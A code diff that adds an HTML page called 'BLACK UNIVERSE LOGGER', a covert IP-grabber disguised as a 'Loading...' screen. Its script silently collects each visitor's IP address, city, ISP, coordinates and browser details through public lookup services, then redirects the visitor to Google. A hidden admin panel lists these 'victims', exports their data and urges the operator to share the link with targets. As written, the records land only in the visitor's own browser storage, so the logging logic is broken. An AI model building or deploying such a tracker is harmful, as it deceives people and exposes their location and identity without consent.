@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #000;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        /* Fake Loading Screen */
+        .fake-loading {
+            text-align: center;
+            animation: fade 2s infinite;
+        }
+
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #00ff00;
+            border-top-color: transparent;
+            border-radius: 50%;
+            margin: 20px auto;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes fade {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* ADMIN PANEL - MODE BARU */
+        .admin-panel {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 10, 0, 0.98);
+            z-index: 10000;
+            overflow-y: auto;
+            display: none;
+            backdrop-filter: blur(10px);
+            padding: 20px;
+        }
+
+        .admin-panel.show {
+            display: block;
+        }
+
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 2px solid #00ff00;
+            margin-bottom: 20px;
+        }
+
+        .admin-title {
+            color: #ff0000;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .admin-close {
+            color: #00ff00;
+            font-size: 40px;
+            cursor: pointer;
+            padding: 10px;
+        }
+
+        /* ADMIN MODE TOGGLE */
+        .admin-mode-toggle {
+            background: #001100;
+            border: 2px solid #00ff00;
+            padding: 15px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .toggle-label {
+            font-size: 16px;
+            color: #00ff00;
+        }
+
+        .toggle-switch {
+            width: 60px;
+            height: 30px;
+            background: #330000;
+            border: 2px solid #ff0000;
+            border-radius: 15px;
+            position: relative;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .toggle-switch.active {
+            background: #003300;
+            border-color: #00ff00;
+        }
+
+        .toggle-switch::after {
+            content: '';
+            position: absolute;
+            width: 26px;
+            height: 26px;
+            background: #ff0000;
+            border-radius: 50%;
+            top: 2px;
+            left: 2px;
+            transition: all 0.3s;
+        }
+
+        .toggle-switch.active::after {
+            background: #00ff00;
+            left: 32px;
+        }
+
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .stat-card {
+            background: #001100;
+            border: 2px solid #00ff00;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 32px;
+            font-weight: bold;
+            color: #00ff00;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: #888;
+        }
+
+        /* Victim List */
+        .victim-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 20px;
+            max-height: 50vh;
+            overflow-y: auto;
+        }
+
+        .victim-card {
+            background: #001100;
+            border: 2px solid #00ff00;
+            padding: 15px;
+            cursor: pointer;
+        }
+
+        .victim-card:active {
+            background: #003300;
+        }
+
+        .victim-ip {
+            font-size: 18px;
+            font-weight: bold;
+            color: #00ff00;
+        }
+
+        .victim-location {
+            font-size: 14px;
+            color: #fff;
+        }
+
+        .victim-time {
+            font-size: 11px;
+            color: #666;
+            margin-top: 5px;
+        }
+
+        /* Action Buttons */
+        .action-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .action-btn {
+            background: transparent;
+            border: 2px solid #00ff00;
+            color: #00ff00;
+            padding: 15px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+        }
+
+        .action-btn:active {
+            background: #00ff00;
+            color: #000;
+        }
+
+        /* Secret Button - MASIH ADA */
+        .secret-btn {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            width: 60px;
+            height: 60px;
+            background: #001100;
+            border: 3px solid #00ff00;
+            border-radius: 50%;
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            opacity: 0.5;
+            cursor: pointer;
+        }
+
+        .secret-btn:active {
+            opacity: 1;
+            transform: scale(1.1);
+        }
+
+        /* Hidden Class */
+        .hidden {
+            display: none !important;
+        }
+
+        /* ADMIN MODE INDICATOR */
+        .admin-mode-badge {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: #ff0000;
+            color: #fff;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            z-index: 10001;
+            display: none;
+        }
+
+        .admin-mode-badge.show {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <!-- Admin Mode Badge -->
+    <div class="admin-mode-badge" id="adminBadge">🛡️ ADMIN MODE</div>
+
+    <!-- Fake Loading -->
+    <div class="fake-loading" id="fakeLoading">
+        <div class="loader"></div>
+        <h2>Loading...</h2>
+        <p style="color: #666;">Please wait</p>
+    </div>
+
+    <!-- Secret Button -->
+    <div class="secret-btn" id="secretBtn" onclick="togglePanel()">
+        🔓
+    </div>
+
+    <!-- ADMIN PANEL -->
+    <div class="admin-panel" id="adminPanel">
+        <div class="admin-header">
+            <span class="admin-title">🎯 BLACK UNIVERSE LOGGER</span>
+            <span class="admin-close" onclick="togglePanel()">✖</span>
+        </div>
+
+        <!-- ADMIN MODE TOGGLE (PENTING!) -->
+        <div class="admin-mode-toggle">
+            <span class="toggle-label">🛡️ ADMIN MODE:</span>
+            <div class="toggle-switch" id="adminToggle" onclick="toggleAdminMode()"></div>
+            <span style="color: #888; font-size: 12px;">ON = No redirect</span>
+        </div>
+
+        <!-- Stats -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-value" id="totalVictims">0</div>
+                <div class="stat-label">TOTAL</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="todayVictims">0</div>
+                <div class="stat-label">HARI INI</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="uniqueIPs">0</div>
+                <div class="stat-label">UNIK</div>
+            </div>
+        </div>
+
+        <!-- Victim List -->
+        <div style="font-size: 14px; margin-bottom: 10px;">📋 DAFTAR VICTIM:</div>
+        <div class="victim-list" id="victimList">
+            <div style="text-align: center; padding: 20px;">Belum ada victim</div>
+        </div>
+
+        <!-- Actions -->
+        <div class="action-grid">
+            <div class="action-btn" onclick="exportData()">📥 EXPORT</div>
+            <div class="action-btn" onclick="copyLink()">🔗 COPY LINK</div>
+            <div class="action-btn" onclick="testMode()">🧪 TEST</div>
+            <div class="action-btn" onclick="clearData()">🗑️ CLEAR</div>
+        </div>
+    </div>
+
+    <script>
+        // ===== VARIABLES =====
+        let victims = JSON.parse(localStorage.getItem('victims')) || [];
+        let adminMode = localStorage.getItem('adminMode') === 'true'; // ADMIN MODE!
+        let panelVisible = false;
+
+        // Update toggle UI
+        function updateToggleUI() {
+            const toggle = document.getElementById('adminToggle');
+            const badge = document.getElementById('adminBadge');
+            
+            if (adminMode) {
+                toggle.classList.add('active');
+                badge.classList.add('show');
+            } else {
+                toggle.classList.remove('active');
+                badge.classList.remove('show');
+            }
+        }
+
+        // ===== TOGGLE ADMIN MODE =====
+        function toggleAdminMode() {
+            adminMode = !adminMode;
+            localStorage.setItem('adminMode', adminMode);
+            updateToggleUI();
+            
+            // Kalo admin mode ON, langsung sembunyiin fake loading
+            if (adminMode) {
+                document.getElementById('fakeLoading').style.opacity = '0.3';
+            } else {
+                document.getElementById('fakeLoading').style.opacity = '1';
+            }
+        }
+
+        // ===== LOG VICTIM (UPDATE) =====
+        async function logVictim() {
+            // CEK ADMIN MODE!
+            if (adminMode) {
+                console.log('ADMIN MODE: Skip logging');
+                return; // GA LOG DIRI SENDIRI
+            }
+
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                
+                const locationResponse = await fetch(`http://ip-api.com/json/${ip}`);
+                const locationData = await locationResponse.json();
+                
+                const victimData = {
+                    ip: ip,
+                    country: locationData.country || 'Unknown',
+                    city: locationData.city || 'Unknown',
+                    isp: locationData.isp || 'Unknown',
+                    lat: locationData.lat,
+                    lon: locationData.lon,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                };
+                
+                saveVictim(victimData);
+                
+                // Redirect hanya kalau BUKAN admin mode
+                setTimeout(() => {
+                    if (!adminMode) {
+                        window.location.href = 'https://www.google.com';
+                    }
+                }, 3000);
+                
+            } catch (error) {
+                console.log('Error:', error);
+                if (!adminMode) {
+                    setTimeout(() => {
+                        window.location.href = 'https://www.google.com';
+                    }, 3000);
+                }
+            }
+        }
+
+        // ===== SAVE VICTIM =====
+        function saveVictim(newVictim) {
+            const existing = victims.find(v => v.ip === newVictim.ip);
+            
+            if (existing) {
+                existing.lastSeen = new Date().toISOString();
+                existing.visitCount = (existing.visitCount || 1) + 1;
+            } else {
+                victims.push({
+                    ...newVictim,
+                    firstSeen: new Date().toISOString(),
+                    lastSeen: new Date().toISOString(),
+                    visitCount: 1
+                });
+            }
+            
+            localStorage.setItem('victims', JSON.stringify(victims));
+            if (panelVisible) {
+                updateVictimList();
+            }
+        }
+
+        // ===== UPDATE VICTIM LIST =====
+        function updateVictimList() {
+            const list = document.getElementById('victimList');
+            list.innerHTML = '';
+            
+            victims.sort((a, b) => new Date(b.timestamp || b.lastSeen) - new Date(a.timestamp || a.lastSeen));
+            
+            victims.forEach(victim => {
+                const card = document.createElement('div');
+                card.className = 'victim-card';
+                card.onclick = () => showDetails(victim);
+                card.innerHTML = `
+                    <div class="victim-ip">${victim.ip}</div>
+                    <div class="victim-location">${victim.city || '-'}, ${victim.country || '-'}</div>
+                    <div class="victim-time">${new Date(victim.timestamp || victim.lastSeen).toLocaleString()}</div>
+                `;
+                list.appendChild(card);
+            });
+            
+            // Update stats
+            document.getElementById('totalVictims').innerHTML = victims.length;
+            
+            const today = new Date().toDateString();
+            const todayCount = victims.filter(v => 
+                new Date(v.timestamp || v.lastSeen).toDateString() === today
+            ).length;
+            document.getElementById('todayVictims').innerHTML = todayCount;
+            
+            const uniqueIPs = new Set(victims.map(v => v.ip)).size;
+            document.getElementById('uniqueIPs').innerHTML = uniqueIPs;
+        }
+
+        // ===== SHOW DETAILS =====
+        function showDetails(victim) {
+            alert(`
+IP: ${victim.ip}
+📍 ${victim.city}, ${victim.country}
+📡 ${victim.isp}
+🌐 ${victim.lat}, ${victim.lon}
+🕐 First: ${new Date(victim.firstSeen).toLocaleString()}
+🕐 Last: ${new Date(victim.lastSeen).toLocaleString()}
+👁️ Kunjungan: ${victim.visitCount}
+            `);
+        }
+
+        // ===== TOGGLE PANEL =====
+        function togglePanel() {
+            const panel = document.getElementById('adminPanel');
+            panelVisible = !panelVisible;
+            panel.classList.toggle('show');
+            if (panelVisible) {
+                updateVictimList();
+            }
+        }
+
+        // ===== EXPORT =====
+        function exportData() {
+            const dataStr = JSON.stringify(victims, null, 2);
+            const blob = new Blob([dataStr], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `victims_${new Date().toISOString().slice(0,10)}.json`;
+            a.click();
+        }
+
+        // ===== COPY LINK =====
+        function copyLink() {
+            const link = window.location.href;
+            navigator.clipboard.writeText(link);
+            alert('✅ Link copied! Share this link to victims');
+        }
+
+        // ===== TEST MODE =====
+        function testMode() {
+            const dummy = [
+                {
+                    ip: '192.168.1.1',
+                    country: 'Indonesia',
+                    city: 'Jakarta',
+                    isp: 'Telkom',
+                    timestamp: new Date().toISOString(),
+                    firstSeen: new Date().toISOString(),
+                    lastSeen: new Date().toISOString(),
+                    visitCount: 1
+                },
+                {
+                    ip: '10.0.0.1',
+                    country: 'Indonesia',
+                    city: 'Bandung',
+                    isp: 'Indihome',
+                    timestamp: new Date().toISOString(),
+                    firstSeen: new Date().toISOString(),
+                    lastSeen: new Date().toISOString(),
+                    visitCount: 3
+                }
+            ];
+            
+            dummy.forEach(d => victims.push(d));
+            localStorage.setItem('victims', JSON.stringify(victims));
+            updateVictimList();
+        }
+
+        // ===== CLEAR DATA =====
+        function clearData() {
+            if (confirm('Hapus semua data victim?')) {
+                victims = [];
+                localStorage.removeItem('victims');
+                updateVictimList();
+            }
+        }
+
+        // ===== INIT =====
+        // Set admin mode dari localStorage
+        updateToggleUI();
+        
+        // Kalo admin mode ON, loading jadi transparan
+        if (adminMode) {
+            document.getElementById('fakeLoading').style.opacity = '0.3';
+        } else {
+            // Kalo bukan admin, jalanin logger
+            logVictim();
+        }
+    </script>
+</body>
+</html>
